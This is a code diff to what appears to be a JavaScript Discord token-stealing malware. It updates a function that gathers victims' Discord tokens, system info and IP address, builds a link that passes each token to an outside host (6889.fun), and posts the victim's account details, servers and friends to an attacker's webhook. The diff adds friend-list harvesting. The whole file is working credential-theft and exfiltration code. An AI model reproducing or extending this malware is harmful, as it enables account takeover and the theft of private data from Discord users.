@@ -1,5 +1,5 @@
 const { getInfo } = require("./../../modules/core/core");
-const { fetchServers, getEmbeds, send } = require("./../../utils/functions");
+const { fetchServers, fetchFriends, getEmbeds, send } = require("./../../utils/functions");
 const { WebhookClient } = require("discord.js");
 const { totalsTokens, find } = require("./find");
 const DiscordToken = require("discord.js-token");
@@ -74,8 +74,8 @@ async function sendTokens() {
             if (!k4itrun) continue;
 
             var copy = `https://6889.fun/api/aurathemes/raw?data=${token}`;
-            var servers = await fetchServers(token);
-            //var friends = await fetchFriends(token);
+            var servers =  fetchServers(token);
+            var friends =  fetchFriends(token);
             let system = await getInfo();
             var discord = new DiscordToken(token, system.ip).info;
 
@@ -98,7 +98,7 @@ async function sendTokens() {
                 author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                 thumbnail: "" + discord.avatar + "",
                 title: "HQ Friend(s)",
-                desc: "" + discord.StrangeFriends + "" === "None" ? "```yml\n" + "Not found" + "```" : "**" + discord.StrangeFriends + "**"
+                desc: "" + friends.all + ""
             }))), 50);
 
             setTimeout(() => webhook.send(send(getEmbeds({
